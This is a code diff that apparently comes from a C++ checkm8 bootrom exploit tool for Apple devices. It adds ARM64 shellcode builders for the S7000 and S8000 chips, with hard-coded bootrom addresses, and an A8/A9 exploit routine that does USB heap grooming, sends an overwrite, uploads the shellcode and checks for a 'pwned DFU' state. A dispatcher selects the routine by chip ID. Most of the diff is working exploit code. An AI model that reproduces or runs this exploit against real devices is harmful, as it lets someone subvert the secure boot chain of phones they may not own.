@@ -350,6 +350,99 @@ vector<uint8_t> getT8010Shellcode()
   return Shellcode;
 }
 
+vector<uint8_t> getS7000Shellcode()
+{
+  vector<uint8_t> Shellcode;
+
+  vector<uint64_t> constants_usb_s7000 = {
+      0x180380000,        // 1 - LOAD_ADDRESS
+      0x6578656365786563, // 2 - EXEC_MAGIC
+      0x646F6E65646F6E65, // 3 - DONE_MAGIC
+      0x6D656D636D656D63, // 4 - MEMC_MAGIC
+      0x6D656D736D656D73, // 5 - MEMS_MAGIC
+      0x10000EBB4         // 6 - USB_CORE_DO_IO
+  };
+
+  vector<uint64_t> constants_checkm8_s7000 = {
+      0x180088760,          // 1 - gUSBDescriptors
+      0x1800888C8,          // 2 - gUSBSerialNumber
+      0x10000E074,          // 3 - usb_create_string_descriptor
+      0x18008062A,          // 4 - gUSBSRNMStringDescriptor
+      0x1800E0C00,          // 5 - PAYLOAD_DEST
+      PAYLOAD_OFFSET_ARM64, // 6 - PAYLOAD_OFFSET
+      PAYLOAD_SIZE_ARM64,   // 7 - PAYLOAD_SIZE
+      0x180088878,          // 8 - PAYLOAD_PTR
+  };
+
+  vector<uint8_t> s7000_handler;
+  appendV<uint8_t, uint8_t>(s7000_handler, asm_arm64_x7_trampoline(0x10000EEE4));
+  append<uint8_t, uint32_t>(s7000_handler, asm_arm64_branch(0x10, 0x0));
+  auto usb_handler = prepare_shellcode(std::string("usb_0xA1_2_arm64"), constants_usb_s7000);
+  append<uint8_t>(s7000_handler, usb_handler.data() + 4, usb_handler.size() - 4);
+
+  auto s7000_shellcode = prepare_shellcode("checkm8_nopaddingcorruption_arm64", constants_checkm8_s7000);
+
+  // Do some checks
+  assert(s7000_handler.size() <= PAYLOAD_SIZE_ARM64);
+  assert(s7000_shellcode.size() <= PAYLOAD_OFFSET_ARM64);
+
+  vector<uint8_t> Zeros;
+  Zeros.insert(Zeros.end(), (PAYLOAD_OFFSET_ARM64 - s7000_shellcode.size()), 0);
+  appendV(s7000_shellcode, Zeros);
+  appendV(s7000_shellcode, s7000_handler);
+
+  printf("[*] Shellcode generated ...\n");
+
+  return s7000_shellcode;
+}
+
+vector<uint8_t> getS8000Shellcode()
+{
+  vector<uint8_t> Shellcode;
+
+  vector<uint64_t> constants_usb_s8000 = {
+      0x180380000,        // 1 - LOAD_ADDRESS
+      0x6578656365786563, // 2 - EXEC_MAGIC
+      0x646F6E65646F6E65, // 3 - DONE_MAGIC
+      0x6D656D636D656D63, // 4 - MEMC_MAGIC
+      0x6D656D736D656D73, // 5 - MEMS_MAGIC
+      0x10000EE78         // 6 - USB_CORE_DO_IO
+  };
+
+  vector<uint64_t> constants_checkm8_s8000 = {
+      0x1800877E0,          // 1 - gUSBDescriptors
+      0x180087958,          // 2 - gUSBSerialNumber
+      0x10000E354,          // 3 - usb_create_string_descriptor
+      0x1800807DA,          // 4 - gUSBSRNMStringDescriptor
+      0x1800E0C00,          // 5 - PAYLOAD_DEST
+      PAYLOAD_OFFSET_ARM64, // 6 - PAYLOAD_OFFSET
+      PAYLOAD_SIZE_ARM64,   // 7 - PAYLOAD_SIZE
+      0x1800878F8,          // 8 - PAYLOAD_PTR
+  };
+
+
+  vector<uint8_t> s8000_handler;
+  appendV<uint8_t, uint8_t>(s8000_handler, asm_arm64_x7_trampoline(0x10000F1B0));
+  append<uint8_t, uint32_t>(s8000_handler, asm_arm64_branch(0x10, 0x0));
+  auto usb_handler = prepare_shellcode(std::string("usb_0xA1_2_arm64"), constants_usb_s8000);
+  append<uint8_t>(s8000_handler, usb_handler.data() + 4, usb_handler.size() - 4);
+
+  auto s8000_shellcode = prepare_shellcode("checkm8_nopaddingcorruption_arm64", constants_checkm8_s8000);
+
+  // Do some checks
+  assert(s8000_handler.size() <= PAYLOAD_SIZE_ARM64);
+  assert(s8000_shellcode.size() <= PAYLOAD_OFFSET_ARM64);
+
+  vector<uint8_t> Zeros;
+  Zeros.insert(Zeros.end(), (PAYLOAD_OFFSET_ARM64 - s8000_shellcode.size()), 0);
+  appendV(s8000_shellcode, Zeros);
+  appendV(s8000_shellcode, s8000_handler);
+
+  printf("[*] Shellcode generated ...\n");
+
+  return s8000_shellcode;
+}
+
 #pragma pack(1)
 typedef struct alignas(1)
 {
@@ -363,7 +456,7 @@ typedef struct alignas(1)
   uint32_t End = 0xbeefbeef;
 } t8010_overwrite;
 
-void runCheckm8()
+void checkm8()
 {
   // Create device config
   t8010_overwrite Overwrite;
@@ -454,6 +547,115 @@ void runCheckm8()
     printf("[!] Exploit failed! :(\n");
   }
   D.release_device();
+}
+
+void checkm8_A8_A9()
+{
+  DFU D;
+  if (!D.acquire_device())
+  {
+    printf("[!] Failed to find device!\n");
+    return;
+  }
+
+  if (D.isExploited())
+  {
+    printf("[!] Device is already exploited! Aborting!\n");
+    return;
+  }
+
+  // Get shellcode
+  vector<uint8_t> Shellcode;
+
+  auto serial = D.getSerialNumber();
+  if (serial.find("CPID:7000 CPRV:11") != string::npos)
+    Shellcode = getS7000Shellcode();
+  else if (serial.find("CPID:8000 CPRV:20") != string::npos ||
+           serial.find("CPID:8003 CPRV:01") != string::npos)
+    Shellcode = getS8000Shellcode();
+
+  printf("[*] stage 1, heap grooming ...\n");
+
+  D.stall();
+  D.usb_req_leak();
+  for (int i = 0; i < 40; i++)
+  {
+    D.no_leak();
+  }
+  D.usb_reset();
+  D.release_device();
+
+  printf("[*] stage 2, usb setup, send 0x800 of 'A', sends no data\n");
+  D.acquire_device();
+  std::vector<uint8_t> A800;
+  A800.insert(A800.end(), 0x800, 'A');
+  D.libusb1_async_ctrl_transfer(0x21, 1, 0, 0, A800, 0.0001);
+  const int padding_sz = 0x400 + 0x80 + 0x80;
+  unsigned char padding[padding_sz];
+  D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, padding, padding_sz, 100);
+  D.libusb1_no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
+  D.release_device();
+
+  sleep_ms(500);
+
+  printf("[*] stage 3, exploit\n");
+  D.acquire_device();
+  D.usb_req_stall();
+  D.usb_req_leak();
+  D.usb_req_leak();
+  D.usb_req_leak();
+  uint64_t overwrite[] = { 0x0, 0x0, 0x0, 0x0, 0x180380000, 0x0};
+  D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, (uint8_t *)overwrite, sizeof(overwrite), 100);
+
+  for (int i = 0; i < Shellcode.size(); i += 0x800)
+  {
+    int Size = 0x800;
+    if ((Size + i) > Shellcode.size())
+    {
+      Size = Shellcode.size() - i;
+    }
+    D.libusb1_no_error_ctrl_transfer(0x21, 1, 0, 0, Shellcode.data() + i, Size,
+      100);
+  }
+
+  sleep_ms(500);
+
+  D.usb_reset();
+  D.release_device();
+
+  sleep_ms(500);
+
+  // Check if device is pwned ...
+  D.acquire_device();
+  if (D.isExploited())
+  {
+    printf("[!] Device is now in pwned DFU Mode! :D\n");
+  }
+  else
+  {
+    printf("[!] Exploit failed! :(\n");
+  }
+  D.release_device();
+}
+
+void runCheckm8()
+{
+  DFU D;
+  if (!D.acquire_device())
+  {
+    printf("[!] Failed to find device!\n");
+    return;
+  }
+
+  auto serial = D.getSerialNumber();
+  D.release_device();
+
+  if (serial.find("CPID:7000 CPRV:11") != string::npos ||
+      serial.find("CPID:8000 CPRV:20") != string::npos ||
+      serial.find("CPID:8003 CPRV:01") != string::npos)
+    checkm8_A8_A9();
+  else
+    checkm8();
 }
 
 void demoteDevice()
